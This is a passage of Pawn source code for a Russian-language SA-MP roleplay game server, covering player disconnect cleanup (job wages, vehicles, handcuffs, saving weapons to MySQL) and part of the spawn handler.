	mysql_format(dbHandle, STRING_GLOBAL, 128, "SELECT * FROM bans WHERE name = '%e'", GetName(playerid));
	mysql_tquery(dbHandle, STRING_GLOBAL, "check_banlist", "i", playerid);

	PlayerTimer[playerid][@_200] = SetTimerEx("@200mc_Timer", 200, true, "d", playerid);
	PlayerTimer[playerid][@_1000] = SetTimerEx("@1000mc_Timer", 1000, true, "d", playerid);
	return 1;
}

public OnPlayerDisconnect(playerid, reason)
{
	if(g_CefLoaded[playerid])
    {
        cef_destroy_browser(playerid, CEF_INTERFACE_BROWSER_ID);
        g_CefLoaded[playerid] = false;
        g_HudVisible[playerid] = false;
        DeletePVar(playerid, "cefload");
    }

    bplayer--;

    PI[playerid][pBottles] = 0;

    KillTimer(PlayerTimer[playerid][@_200]);
    KillTimer(PlayerTimer[playerid][@_1000]);

	if(STimer[playerid] != -1) KillTimer(STimer[playerid]), STimer[playerid] = -1;
	if(engine_improvement[playerid] != -1) KillTimer(engine_improvement[playerid]), engine_improvement[playerid] = -1;

	for(new idx; idx < MAX_BOTTLES; idx ++)
	{
		if(g_bottles_object[playerid][idx] != -1)
		{
			DestroyPlayerObject(playerid, g_bottles_object[playerid][idx]);
		}
	}

    SetPlayerSkills(playerid);

	if(_:FamilyName[playerid] != -1)
	{
		DestroyDynamic3DTextLabel(FamilyName[playerid]);
		FamilyName[playerid] = Text3D:-1;
	}

	if(PI[playerid][P_JOB] != JOB_NONE)
	{
		if(PI[playerid][P_JOB] == JOB_MINER)
		{
			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Рабочий день завершён. Вы добыли: {FF9900}%d кг {37c268}руды",pPressed[playerid]);
			SendClientMessage(playerid, C_CROM, STRING_GLOBAL);

			if(!doubling_donate)
			{
				format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Заработано {FF9900}%d {37c268}рублей.",pPressed[playerid]*4);
				SendClientMessage(playerid, C_CROM, STRING_GLOBAL);

				format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "~g~+%i RUB",pPressed[playerid]*4);
				GameTextForPlayer(playerid, STRING_GLOBAL, 5000, 1);

				GiveMoney(playerid, pPressed[playerid]*4, "Зарплата на шахте");
			}
			else
			{
			    format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Заработано {FF9900}%d {37c268}рублей.",pPressed[playerid]*8);
				SendClientMessage(playerid, C_CROM, STRING_GLOBAL);

				format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "~g~+%i RUB",pPressed[playerid]*8);
				GameTextForPlayer(playerid, STRING_GLOBAL, 5000, 1);

				GiveMoney(playerid, pPressed[playerid]*8, "Зарплата на шахте");
			}

   			RemovePlayerAttachedObject(playerid,1);
		   	RemovePlayerAttachedObject(playerid,2);// забрали тачку
		   	RemovePlayerAttachedObject(playerid,3);// забрали тачку

			if(PI[playerid][pMember]) SetPlayerSkin(playerid, PI[playerid][pMemberSkin]);
			else SetPlayerSkin(playerid, PI[playerid][pModel]);

			DisablePlayerCheckpoint(playerid);
			PI[playerid][P_JOB] = JOB_NONE;
			pPressed[playerid] = 0;
			SetPVarInt(playerid, "relate", 0);
		}
		if(PI[playerid][P_JOB] == JOB_GRUZ_WOOD)
		{
			if(PI[playerid][pMember]) SetPlayerSkin(playerid, PI[playerid][pMemberSkin]);
				else SetPlayerSkin(playerid, PI[playerid][pModel]);

			DisablePlayerCheckpoint(playerid);
			PI[playerid][P_JOB] = JOB_NONE;
			pPressed[playerid] = 0;
			DeletePVar(playerid, "relate");

			if(IsPlayerAttachedObjectSlotUsed(playerid, 4))
				RemovePlayerAttachedObject(playerid, 4);

			if(!doubling_donate)
			{
			    new money = pPressed[playerid]*5;

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "{e0c600}Вы закончили рабочий день, Ваш заработок: %iр",money);
				SendClientMessage(playerid, COLOR_WHITE, STRING_GLOBAL);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "~g~+%dр", money);
				GameTextForPlayer(playerid,STRING_GLOBAL,3000,1);

				GiveMoney(playerid, money, "Зарплата на грузчиках");
			}
			else
			{
			    new money = pPressed[playerid]*9;

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "{e0c600}Вы закончили рабочий день, Ваш заработок: %iр",money);
				SendClientMessage(playerid, COLOR_WHITE, STRING_GLOBAL);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "~g~+%dр", money);
				GameTextForPlayer(playerid,STRING_GLOBAL,3000,1);

				GiveMoney(playerid, money, "Зарплата на грузчиках");
			}

			if(PI[playerid][pMember]) SetPlayerSkin(playerid, PI[playerid][pMemberSkin]);
			else SetPlayerSkin(playerid, PI[playerid][pModel]);

		}
		if(PI[playerid][P_JOB] == JOB_LOGGER)
		{
			if(PI[playerid][pMember]) SetPlayerSkin(playerid, PI[playerid][pMemberSkin]);
				else SetPlayerSkin(playerid, PI[playerid][pModel]);

			DisablePlayerCheckpoint(playerid);
			PI[playerid][P_JOB] = JOB_NONE;
			pPressed[playerid] = 0;
			DeletePVar(playerid, "relate");

			if(IsPlayerAttachedObjectSlotUsed(playerid, 3))
				RemovePlayerAttachedObject(playerid, 3);

			if(IsPlayerAttachedObjectSlotUsed(playerid, 4))
				RemovePlayerAttachedObject(playerid, 4);

			if(!doubling_donate)
			{
	            new money = pPressed[playerid]*3;
				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "{e0c600}Вы закончили рабочий день, Ваш заработок: %iр",money);
				SendClientMessage(playerid, COLOR_WHITE, STRING_GLOBAL);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "~g~+%dр", money);
				GameTextForPlayer(playerid,STRING_GLOBAL,3000,1);

				GiveMoney(playerid, money, "Зарплата");
			}
			else
			{
	            new money = pPressed[playerid]*6;
				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "{e0c600}Вы закончили рабочий день, Ваш заработок: %iр",money);
				SendClientMessage(playerid, COLOR_WHITE, STRING_GLOBAL);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "~g~+%dр", money);
				GameTextForPlayer(playerid,STRING_GLOBAL,3000,1);

				GiveMoney(playerid, money, "Зарплата");
			}

			if(PI[playerid][pMember]) SetPlayerSkin(playerid, PI[playerid][pMemberSkin]);
			else SetPlayerSkin(playerid, PI[playerid][pModel]);
		}
		if(PI[playerid][P_JOB] == JOB_FARMER)
		{
			if(PI[playerid][pMember]) SetPlayerSkin(playerid, PI[playerid][pMemberSkin]);
				else SetPlayerSkin(playerid, PI[playerid][pModel]);

			DisablePlayerCheckpoint(playerid);
			PI[playerid][P_JOB] = 0;
			pPressed[playerid] = 0;
			DeletePVar(playerid, "relate");

			if(IsPlayerAttachedObjectSlotUsed(playerid, 2))
				RemovePlayerAttachedObject(playerid, 2);

			SendClientMessage(playerid, C_RED, "Вы ушли от места работы, Ваша зарплата аннулирована");
		}
	}
	if(PI[playerid][P_AREND_SCOOTER] != INVALID_VEHICLE_ID)
	{
		SendClientMessage(playerid, C_RED, "Аренда арендованного Вами транспорта была аннулирована.");
		DestroyVehicle(PI[playerid][P_AREND_SCOOTER]);
		PI[playerid][P_AREND_SCOOTER] = INVALID_VEHICLE_ID;
	}

	if(PI[playerid][P_ORDER_ID] != -1)
	{
		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE orders SET status=0 WHERE id=%d", PI[playerid][P_ORDER_ID]);
		mysql_query(dbHandle, STRING_GLOBAL);

		PI[playerid][P_ORDER_BIZ_ID]					=
		PI[playerid][P_ORDER_TIME]						=
		PI[playerid][P_ORDER_ID]						= -1;
	}
	if(PI[playerid][P_FAMILY] != 0)
	{
		Iter_Remove(FamilyMembers[PI[playerid][P_FAMILY]], playerid);
	}

	new message[30], totalstring[128];
 	switch(reason)
     {
        case 0: format(message,sizeof(message), "Обрыв связи");
        case 1: format(message,sizeof(message), "Вышел");
        case 2: format(message,sizeof(message), "Кикнут (%s)", kick_reason[playerid]);
    }

	format(kick_reason[playerid], 64, "Отсутствует");

	if(Iter_Contains(Admins, playerid))
	{
		Iter_Remove(Admins, playerid);

		if(!IsPlayerGrandAdmin(playerid))
		{
			format(message,sizeof(message), "[A] %s %s[%d] покинул игру. Причина: %s", admin_rank_name[PI[playerid][pAdmin]], GetName(playerid), playerid, message);
			SendAdminMessage(COLOR_GREY, totalstring);
		}
	}
	else
	{
		format(totalstring, 128, "[A] %s[%d] покинул сервер. [Причина: %s]", GetName(playerid), playerid, message);
		SendAdminMessage(COLOR_GREY, totalstring, 1);
	}

    slotUsed{playerid} = false;
    PI[playerid][pOnline] = 0;
	MysqlUpdatePlayerInt(playerid, "online", PI[playerid][pOnline]);
    for(new i = 17; i >= 0; i --)
	{
		PlayerUseList[playerid][i]=0;
	}

    KillTimer(player_bus_timer[playerid]);
	player_bus_timer[playerid] = -1;

	if(IsPlayerAttachedObjectSlotUsed(playerid, 0)) RemovePlayerAttachedObject(playerid, 0);
	if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
	if(IsPlayerAttachedObjectSlotUsed(playerid, 2)) RemovePlayerAttachedObject(playerid, 2);
	if(IsPlayerAttachedObjectSlotUsed(playerid, 3)) RemovePlayerAttachedObject(playerid, 3);
	if(IsPlayerAttachedObjectSlotUsed(playerid, 4)) RemovePlayerAttachedObject(playerid, 4);
	if(IsPlayerAttachedObjectSlotUsed(playerid, 5)) RemovePlayerAttachedObject(playerid, 5);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_ADMIN" SET timemin='%d' WHERE name='%s' LIMIT 1", AdminInfo[playerid][admTimeMin], GetName(playerid));
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");

	for(new i; i < MAX_PLAYER_OWNABLE_CARS; i ++)
	{
		if(PI[playerid][P_OWNABLE_CAR][i] == INVALID_VEHICLE_ID)
			continue;

		if(!IsValidVehicle(PI[playerid][P_OWNABLE_CAR][i]))
			continue;

		if(GetVehicleData(PI[playerid][P_OWNABLE_CAR][i], veh_owner_id) != playerid)
			continue;

		UnLoadPlayerOwnableCar(playerid, i);
	}

	if(PI[playerid][PlayerCopterID] != INVALID_VEHICLE_ID)
	{
		DestroyVehicle(PI[playerid][PlayerCopterID]);
		PI[playerid][PlayerCopterID] = INVALID_VEHICLE_ID;
	}

	if(InShop[playerid] > 0 || GetPVarInt(playerid, "InShop") > 0)
	{
	    if(PI[playerid][SalonCarID] != INVALID_VEHICLE_ID) DestroyVehicle(PI[playerid][SalonCarID]);
	    PI[playerid][SalonCarID] = INVALID_VEHICLE_ID;
		DeletePVar(playerid, "InShop");
		InShop[playerid] = 0;
		CancelSelectTextDraw(playerid);
	}
	if(pCuff[playerid][pCuffee] != INVALID_PLAYER_ID && reason == 1)
	{
	    new id = pCuff[playerid][pCuffee];
	    if(id == playerid)
		{
		    new cuffer = pCuff[playerid][pCuffer];

		    STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "%s вышел при аресте и был посажен в тюрьму на 30 минут", GetName(playerid));
			SendClientMessageToAll(COLOR_RED, STRING_GLOBAL);
			PI[playerid][pJail] = 1;
			PI[playerid][pJailTime] = 1800;
			PI[playerid][pWanted] = 0;
			pCuff[cuffer][pCuffer] = INVALID_PLAYER_ID;
			pCuff[cuffer][pCuffee] = INVALID_PLAYER_ID;
			pCuff[playerid][pCuffee] = INVALID_PLAYER_ID;
			pCuff[playerid][pCuffer] = INVALID_PLAYER_ID;
			MysqlUpdatePlayerInt(playerid, "jail", PI[playerid][pJail]);
			MysqlUpdatePlayerInt(playerid, "jailtime", PI[playerid][pJailTime]);
			MysqlUpdatePlayerInt(playerid, "wanted", PI[playerid][pWanted]);
		}
		else if(!IsPlayerConnected(id))
		{
		    SetPlayerSpecialAction(id, SPECIAL_ACTION_NONE);
			RemovePlayerAttachedObject(id, 0);
			pCuff[id][pCuffer] = INVALID_PLAYER_ID;
			pCuff[id][pCuffee] = INVALID_PLAYER_ID;
			pCuff[playerid][pCuffee] = INVALID_PLAYER_ID;
			pCuff[playerid][pCuffer] = INVALID_PLAYER_ID;
			SendClientMessage(playerid, COLOR_LIME, "Офицер, надевший на Вас наручники, вышел из игры. Наручники сняты.");
		}
	}
 	/*if(GetPVarInt(playerid, "arendkey") != -1)
	{
		new v = GetPVarInt(playerid, "arendkey");
		if(ArendInfo[v][aPlayerID] == playerid)
		{
			ArendInfo[v][aPlayerID] = INVALID_PLAYER_ID;
            SetVehicleToRespawn(ArendInfo[v][aID]);
			CarDoorsEx(ArendInfo[v][aID], 0);
		}
    }*/
	if(GetPVarInt(playerid,"objectcop"))
	{
		DestroyObject(GetPVarInt(playerid,"objectcop"));
		DestroyDynamicArea(Ships[playerid]);
	}
	PI[playerid][pBed] = 0;
	MysqlUpdatePlayerInt(playerid, "bed", PI[playerid][pBed]);
	PlayerDied[playerid] = false;
	drawcapt[playerid] = false;
 	if(PlayerUseMask[playerid])
	{
        PlayerUseMask[playerid] = false;
		KillTimer(MaskTimer[playerid]);
	}
	if(UseGPS[playerid])
	{
    	DisablePlayerRaceCheckpoint(playerid);
    	UseGPS[playerid] = false;
    	for(new i; i < 3; i++) TextDrawHideForPlayer(playerid, gps_td);
	}
	PlayerTextDrawHide(playerid,VehNazv[playerid]);
	PlayerTextDrawHide(playerid,VehCost[playerid]);
	if(GetPVarInt(playerid, "TruckerJob"))
	{
	    DestroyVehicleEx(TruckerCar[playerid]);
	    TruckerCar[playerid] = 0;
	    TruckerGruz[playerid] = 0;
		DeletePVar(playerid, "TruckerJobTime");
		DeletePVar(playerid, "TruckerJob");
		DeletePVar(playerid, "TruckerJobRazgruzka");
	}
	if(GetPVarInt(playerid, "PriceBus") > 0)
	{
		PI[playerid][pPayCheck] += GetPVarInt(playerid, "BusMoney");
		if(IsValidDynamic3DTextLabel(BusText3D[playerid])) DestroyDynamic3DTextLabel(BusText3D[playerid]);
		new id = PI[playerid][BusCarID];
		SetVehiclePos(id, g_vehicle[id][veh_x], g_vehicle[id][veh_y], g_vehicle[id][veh_z]);
		SetVehicleZAngle(id, g_vehicle[id][veh_a]);
		SetVehicleHealth(id, 1000.0);
		MysqlUpdatePlayerInt(playerid, "paycheck", PI[playerid][pPayCheck]);
	}
	if(GetPVarInt(playerid, "PriceTaxi") > 0)
	{
		PI[playerid][pPayCheck] += GetPVarInt(playerid, "TaxiMoney");
		if(IsValidDynamic3DTextLabel(TaxiText3D[playerid])) DestroyDynamic3DTextLabel(TaxiText3D[playerid]);
		new id = PI[playerid][TaxiCarID];
		SetVehiclePos(id, g_vehicle[id][veh_x], g_vehicle[id][veh_y], g_vehicle[id][veh_z]);
		SetVehicleZAngle(id, g_vehicle[id][veh_a]);
		SetVehicleHealth(id, 1000.0);
		MysqlUpdatePlayerInt(playerid, "paycheck", PI[playerid][pPayCheck]);
	}
	if(PI[playerid][MechanicCarID] != INVALID_VEHICLE_ID){
		new id = PI[playerid][MechanicCarID];
		SetVehiclePos(id, g_vehicle[id][veh_x], g_vehicle[id][veh_y], g_vehicle[id][veh_z]);
		SetVehicleZAngle(id, g_vehicle[id][veh_a]);
		SetVehicleHealth(id, 1000.0);
	}

	/*foreach(new i: Player)
	{
        if(GetPlayerState(i) == PLAYER_STATE_SPECTATING && PI[i][Spectating][0] == playerid)
        {
            GameTextForPlayer(i, "PLAYER DISCONNECTED", 3000, 3);
            callcmd::specoff(i, "");
	    }
	}*/

	if(PI[playerid][P_SPEC_ADM] != INVALID_PLAYER_ID)
	{
		new to_player = PI[playerid][P_SPEC_ADM];

		if(GetPlayerState(to_player) == PLAYER_STATE_SPECTATING && PI[to_player][Spectating][0] == playerid)
        {
            GameTextForPlayer(to_player, "PLAYER DISCONNECTED", 3000, 3);
            callcmd::specoff(to_player, "");
	    }
	}

	if(GetPVarInt(playerid, "report_id"))
	{
		new report_id = GetPVarInt(playerid, "report_id");

		gReport[report_id][rIsTooked] = false;
		gReport[report_id][rID] = report_id;
		gReport[report_id][rPlayerID] = -1;
		gReport[report_id][rText][0] = EOS;
		gReport[report_id][rWhenWroted_Time] = -1;
		gReport[report_id][rWhenWroted_Text][0] = EOS;
    }

	PlayerMenuExit(playerid);

    for(new i = 0; i < 3; i++) TextDrawHideForPlayer(playerid, select_skin[i]);
    PlayerTextDrawDestroy(playerid, SelSkin[playerid]);

    for(new i = 0; i < 10; i++)
	{
		PlayerTextDrawDestroy(playerid, SecurityCode[playerid][i]);
		SecurityCode[playerid][i] = PlayerText:INVALID_TEXT_DRAW;
	}
	for(new i = 0; i < 6; i++)
	{
		PlayerTextDrawDestroy(playerid, StatusWork[playerid][i]);
		StatusWork[playerid][i] = PlayerText:INVALID_TEXT_DRAW;
	}
	for(new i = 0; i < 2; i++)
	{
		PlayerTextDrawDestroy(playerid, JRP_TD[playerid][i]);
		JRP_TD[playerid][i] = PlayerText:INVALID_TEXT_DRAW;
	}
	/*for(new i; i < 9; i++)
	{
		    PlayerTextDrawDestroy(playerid, money_td_player[playerid][i]);
	}*/
	CancelSelectTextDraw(playerid);

	new gun_string[56], ammo_string[56];
	format(gun_string, 56, "%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d",
	PI[playerid][pGun][0], PI[playerid][pGun][1], PI[playerid][pGun][2], PI[playerid][pGun][3],
	PI[playerid][pGun][4], PI[playerid][pGun][5], PI[playerid][pGun][6], PI[playerid][pGun][7],
	PI[playerid][pGun][8], PI[playerid][pGun][9], PI[playerid][pGun][10], PI[playerid][pGun][11],
	PI[playerid][pGun][12]);

	format(ammo_string, 56, "%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d",
	PI[playerid][pAmmo][0], PI[playerid][pAmmo][1], PI[playerid][pAmmo][2], PI[playerid][pAmmo][3],
	PI[playerid][pAmmo][4], PI[playerid][pAmmo][5], PI[playerid][pAmmo][6], PI[playerid][pAmmo][7],
	PI[playerid][pAmmo][8], PI[playerid][pAmmo][9], PI[playerid][pAmmo][10], PI[playerid][pAmmo][11],
	PI[playerid][pAmmo][12]);

    STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_ACCOUNTS" SET `guns` = '%s',`ammos` = '%s' WHERE `name` = '%s'", gun_string, ammo_string, GetName(playerid));
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");

	SetPlayerDataToDefault(playerid);
	rodEnable{playerid} = 0;
	rodRaised{playerid} = 0;

	// KillPlayerTimers(playerid);
    //---------------------------------------------

	return 1;
}

stock PreloadAnimLibs(playerid)
{
    PreloadAnimLib(playerid,"BOMBER");
	PreloadAnimLib(playerid,"BD_FIRE");
	PreloadAnimLib(playerid,"RAPPING");
	PreloadAnimLib(playerid,"SHOP");
	PreloadAnimLib(playerid,"BEACH");
	PreloadAnimLib(playerid,"SMOKING");
	PreloadAnimLib(playerid,"FOOD");
	PreloadAnimLib(playerid,"ON_LOOKERS");
	PreloadAnimLib(playerid,"DEALER");
	PreloadAnimLib(playerid,"CRACK");
	PreloadAnimLib(playerid,"CARRY");
	PreloadAnimLib(playerid,"CASINO");
	PreloadAnimLib(playerid,"COP_AMBIENT");
	PreloadAnimLib(playerid,"PARK");
	PreloadAnimLib(playerid,"INT_HOUSE");
	PreloadAnimLib(playerid,"FOOD");
	PreloadAnimLib(playerid,"CRIB");
	PreloadAnimLib(playerid,"ROB_BANK");
	PreloadAnimLib(playerid,"JST_BUISNESS");
	PreloadAnimLib(playerid,"PED");
	PreloadAnimLib(playerid,"OTB");
	PreloadAnimLib(playerid,"BUDDY");
	PreloadAnimLib(playerid,"SWORD");
	PreloadAnimLib(playerid,"CAR_CHAT");
	PreloadAnimLib(playerid,"CHAINSAW");
	PreloadAnimLib(playerid,"FAT");
	PreloadAnimLib(playerid,"goggles");
	PreloadAnimLib(playerid,"INT_OFFICE");
	PreloadAnimLib(playerid,"BENCHPRESS");
	PreloadAnimLib(playerid,"GANGS");
	PreloadAnimLib(playerid,"RYDER");
	PreloadAnimLib(playerid,"MISC");
	PreloadAnimLib(playerid,"DANCING");
	PreloadAnimLib(playerid,"RIOT");
}


public OnPlayerSpawn(playerid)
{
	// --------- Cef -----------::
	//cef_create_browser(playerid, 15, "http://wh11268.web1.maze-host.ru/register/index.html", false, false);
	//cef_create_browser(playerid, 0x12346, "supreme-launcher.myarena.site/index.html", false, false);

	// --------------------------
	if(PlayerLogged[playerid] != true)
	{
	    SendMess(playerid, MSG_PLAYER_NEED_TO_LOGGED);
		return SKick(playerid, 2);
	}
	StopAudioStreamForPlayer(playerid);
	PlayerSpawned[playerid] = false;
	if(PI[playerid][pCash])
	{
		ResetPlayerMoney(playerid);
		GivePlayerMoney(playerid, PI[playerid][pCash]);
	}

    TogglePlayerControllable(playerid, true);
    SetHealth(playerid, 100);
    SetHunger(playerid, PI[playerid][pHunger]);
 	DisablePlayerCheckpoint(playerid);
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerScore(playerid, PI[playerid][pLevel]);
	if(PI[playerid][pFightStyle]) SetPlayerFightingStyle(playerid, PI[playerid][pFightStyle]);
	else SetPlayerFightingStyle(playerid, 0);
	if(PI[playerid][pWanted]) SetPlayerWantedLevel(playerid, PI[playerid][pWanted]);
	PlayerPlaySound(playerid, 1184, 0.0, 0.0, 0.0);
	SetPVarInt(playerid, "K_Times", 0);
    SetPVarInt(playerid, "AC_Protection", 1);
    Air_Gettime(playerid, 6);
    SetPlayerSkills(playerid);
	if(GetPVarInt(playerid, "Connected"))
	{
		for(new i = 12; i >= 0; i--)
		{
			if(!PI[playerid][pGun][i] || !PI[playerid][pAmmo][i]) continue;
			GivePlayerWeapon(playerid, PI[playerid][pGun][i], PI[playerid][pAmmo][i]);
		}
		new gun_string[56], ammo_string[56];
		format(gun_string, 56, "0,0,0,0,0,0,0,0,0,0,0,0,0");
		format(ammo_string, 56, "0,0,0,0,0,0,0,0,0,0,0,0,0");

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_ACCOUNTS" SET `guns` = '%s', `ammos` = '%s' WHERE `name` = '%s'", gun_string, ammo_string, GetName(playerid));
		mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
		DeletePVar(playerid, "Connected");
		PreloadAnimLibs(playerid);
	}
	if(PI[playerid][pMember]) SetPlayerSkin(playerid, PI[playerid][pMemberSkin]);
	else SetPlayerSkin(playerid, PI[playerid][pModel]);
	SetPlayerColorEx(playerid, TeamColors[GetTeamID(playerid)]);
	if(PI[playerid][Spectating][0] != INVALID_PLAYER_ID)
	{
	    SetPlayerPos(playerid, GetPVarFloat(playerid, "SpecX"), GetPVarFloat(playerid, "SpecY"), GetPVarFloat(playerid, "SpecZ"));
	    SetPlayerFacingAngle(playerid, GetPVarFloat(playerid, "SpecA"));
		SetPlayerVirtualWorld(playerid, GetPVarInt(playerid, "SpecVw"));
		SetPlayerInterior(playerid, GetPVarInt(playerid, "SpecInt"));
		DeletePVar(playerid, "SpecInt");
		DeletePVar(playerid, "SpecVw");
		DeletePVar(playerid, "SpecX");
		DeletePVar(playerid, "SpecY");
		DeletePVar(playerid, "SpecZ");
		DeletePVar(playerid, "SpecA");
		PI[playerid][Spectating][0] = INVALID_PLAYER_ID;
		PI[playerid][Spectating][1] = INVALID_PLAYER_ID;
		SetPlayerColorEx(playerid, TeamColors[GetTeamID(playerid)]);
		SetPlayerScore(playerid, PI[playerid][pLevel]);
		if(PI[playerid][pWanted]) SetPlayerWantedLevel(playerid, PI[playerid][pWanted]);
		if(PI[playerid][pMember]) SetPlayerSkin(playerid, PI[playerid][pMemberSkin]);
		else if(Oldskin2[playerid] > 0) SetPlayerSkin(playerid, Oldskin2[playerid]);
		else SetPlayerSkin(playerid, PI[playerid][pModel]);
		return 1;
	}
	else if(ClothesRound[playerid] == 1)
	{
	    new str[10];
		SendClientMessage(playerid, C_BLUE, "Выберите себе подходящую одежду, после выбора нажмите 'Выбрать'");
		SetPlayerVirtualWorld(playerid,playerid);
	    SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid, -542.1410,913.1683,12.1504);
		SetPlayerFacingAngle(playerid, 88.1591);
		SetPlayerCameraPos(playerid, -547.866577, 915.799011, 14.658411);
		SetPlayerCameraLookAt(playerid, -543.564147, 913.861450, 13.004609);
		//ApplyAnimation(playerid,"DEALER","DEALER_IDLE",4.1,1,1,1,1,1);
        if(PI[playerid][pSex] == 1) format(str, 10, "ID: %d", JoinRegM[SelectCharPlace[playerid]]);
        else format(str, 10, "id:_%d", JoinRegF[SelectCharPlace[playerid]]);
        for(new i; i < 4; i++) TextDrawShowForPlayer(playerid, select_skin[i]);
		SelectTextDraw(playerid, 0x009900FF);
		SetHealth(playerid, 100.0);
		if(PI[playerid][pSex] == 1) SetPlayerSkin(playerid, JoinRegM[SelectCharPlace[playerid]]), ChosenSkin[playerid] = JoinRegM[0];
		else SetPlayerSkin(playerid, JoinRegF[SelectCharPlace[playerid]]), ChosenSkin[playerid] = JoinRegF[0];
		//TogglePlayerControllable(playerid, 0);
	}
	else if(ClothesRound[playerid] == 2)
	{
		SendClientMessage(playerid, C_BLUE, "Выберите себе подходящую одежду, после выбора нажмите 'Далее', для отмены нажмите 'Выход'");
		SendClientMessage(playerid, C_BLUE, "Чтобы просмотреть одежду, используйте стрелочки на экране!");

		new WM = 2 +random(100);
		SetPlayerVirtualWorld(playerid,WM);

	    SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid, -542.1410,913.1683,12.1504);
		SetPlayerFacingAngle(playerid, 88.1591);
		SetPlayerCameraPos(playerid, -547.866577, 915.799011, 14.658411);
		SetPlayerCameraLookAt(playerid, -543.564147, 913.861450, 13.004609);
		ApplyAnimation(playerid,"DEALER","DEALER_IDLE",4.1,1,1,1,1,1);
		TogglePlayerControllable(playerid, 0);
		for(new i; i < 6; i++) TextDrawShowForPlayer(playerid, Button[i]);
		SelectTextDraw(playerid, COLOR_ORANGE);
		STRING_GLOBAL[0] = EOS;
		if(PI[playerid][pSex] == 1)
		{
			SelectCharPlace[playerid] = 0;
			SetPlayerSkin(playerid, JoinShopM[SelectCharPlace[playerid]][0]);
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "~w~ЦЕНА: ~g~%iр", JoinShopM[SelectCharPlace[playerid]][1]);
		}
		else
		{
			SelectCharPlace[playerid] = 0;
			SetPlayerSkin(playerid, JoinShopF[SelectCharPlace[playerid]][0]);
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "~w~ЦЕНА: ~g~%iр", JoinShopF[SelectCharPlace[playerid]][1]);
		}
  		GameTextForPlayer(playerid, STRING_GLOBAL, 5000, 1);
	}
	else if(PI[playerid][pJail] == 1)
	{
		SetPlayerInterior(playerid, 0);
		new idx = random(sizeof coord_spawn_demorgan);
		SetPlayerPos(playerid, coord_spawn_demorgan[idx][0], coord_spawn_demorgan[idx][1], coord_spawn_demorgan[idx][2]);
		SetPlayerFacingAngle(playerid, coord_spawn_demorgan[idx][3]);
		SetCameraBehindPlayer(playerid);
		FreezePlayer(playerid, 5000);
  		new string[80];
		format(string, sizeof(string), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~y~JAILED: ~w~%d", PI[playerid][pJailTime]);
		GameTextForPlayer(playerid, string, 3000, 3);
		SendClientMessage(playerid, C_RED, "Вы еще не отсидели свой тюремный срок (( /time ))");
	}
	else if(PI[playerid][pJail] == 2)
	{
		SetPlayerInterior(playerid, 0);
		SetPlayerPos(playerid,585.3808,2785.6555,1253.9860);
		SetPlayerFacingAngle(playerid, 273.0676);
		SetCameraBehindPlayer(playerid);
		FreezePlayer(playerid, 5000);
  		new string[80];
		format(string, sizeof(string), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~y~JAILED: ~w~%d", PI[playerid][pJailTime]);
		GameTextForPlayer(playerid, string, 3000, 3);
		SendClientMessage(playerid, C_RED, "Вы еще не отсидели свой тюремный срок (( /time ))");
	}
	else if(PI[playerid][pJail] == 3)
	{
	    SetPlayerInterior(playerid, 0);
		SetPlayerPos(playerid,585.1162,2788.9954,1253.9860);
		SetPlayerFacingAngle(playerid, 269.4590);
		SetCameraBehindPlayer(playerid);
		FreezePlayer(playerid, 5000);
		new string[80];
		format(string, sizeof(string), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~y~JAILED: ~w~%d", PI[playerid][pJailTime]);
		GameTextForPlayer(playerid, string, 3000, 3);
		SendClientMessage(playerid, C_RED, "Вы еще не от?sидели свой тюремный срок (( /time ))");
	}
	else if(PI[playerid][pJail] == 4)
	{
		SetPlayerInterior(playerid, 0);
		SetPlayerPos(playerid,-1768.5857,2939.7861,988.7100);
		SetPlayerFacingAngle(playerid, 270.0000);
		SetCameraBehindPlayer(playerid);
		FreezePlayer(playerid, 5000);
		new string[80];
		format(string, sizeof(string), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~y~JAILED: ~w~%d", PI[playerid][pJailTime]);
		GameTextForPlayer(playerid, string, 3000, 3);
		SendClientMessage(playerid, C_RED, "Вы еще не отсидели свой тюремный срок (( /time ))");
	}
	else if(PI[playerid][P_PB_TEAM] != -1 && g_paintball_info[PB_STATUS] == 2)
	{
